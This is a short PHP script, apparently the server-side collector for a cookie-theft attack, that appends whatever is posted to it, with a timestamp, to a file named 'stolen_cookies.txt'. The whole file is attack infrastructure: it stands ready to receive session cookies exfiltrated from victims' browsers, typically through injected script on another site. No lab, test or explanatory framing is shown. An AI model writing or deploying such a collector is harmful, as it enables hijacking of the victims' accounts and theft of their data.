<?php
$file = fopen('stolen_cookies.txt', 'a');
fwrite($file, date('Y-m-d H:i:s') . ' - ' . file_get_contents('php://input') . "\n");
fclose($file);
?>
